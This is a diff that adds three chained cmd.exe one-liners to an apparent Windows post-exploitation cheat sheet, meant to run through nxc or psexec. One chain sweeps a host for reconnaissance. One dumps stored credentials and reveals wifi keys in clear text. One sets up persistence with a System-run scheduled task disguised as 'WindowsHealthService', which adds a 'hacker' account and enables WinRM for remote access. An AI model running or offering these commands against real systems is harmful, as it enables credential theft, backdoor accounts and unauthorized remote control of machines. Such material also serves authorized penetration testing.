@@ -5,6 +5,41 @@
 <!-- tags: windows, cmd, cli, post, enum -->
 <!-- platform: windows -->
 
+> **Chain entries** bundle common cmd.exe sequences. `&` runs each regardless of prior exit code; `&&` stops on failure. All chains work via `nxc smb <host> -u U -p P -x "<chain>"` or `psexec` without quoting gymnastics.
+
+---
+
+## windows-cmd chain host triage one shot
+Full host-fingerprint sweep: identity + hostname + OS + users + groups + network (ip/netstat/arp/route) + shares. Replaces 10 individual picks with one `nxc -x` payload.
+
+```bash
+whoami /all & hostname & systeminfo & net user & net localgroup Administrators & net group /domain 2>nul & ipconfig /all & netstat -ano & arp -a & route print & net share
+```
+
+<!-- meta: risk=low | phase=enum | tags=cmd,chain,triage,recon,one-shot -->
+
+---
+
+## windows-cmd chain creds and wifi hunt
+cmdkey vault listing + wifi profiles + reveal single wifi password + EFS encrypted-files listing. Covers the three main local credential stashes a Windows host leaks.
+
+```bash
+cmdkey /list & netsh wlan show profiles & netsh wlan show profile name="{{PROFILE:str}}" key=clear & cipher /u /n /h
+```
+
+<!-- meta: risk=low | phase=credaccess | tags=cmd,chain,cmdkey,wifi,efs,creds -->
+
+---
+
+## windows-cmd chain quick persistence
+Schtask on logon + enable WinRM service + start it. Combined "I have admin, give me a login persistence AND a remote shell" primitive. VERY LOUD — only when you own the box.
+
+```bash
+schtasks /create /tn "WindowsHealthService" /tr "cmd.exe /c {{PAYLOAD:str:net user hacker Passw0rd! /add}}" /sc onlogon /ru System /f & reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinRM" /v Start /t REG_DWORD /d 2 /f & net start winrm
+```
+
+<!-- meta: risk=high | phase=persistence | tags=cmd,chain,schtask,winrm,persistence,backdoor -->
+
 ---
 
 ## current user windows
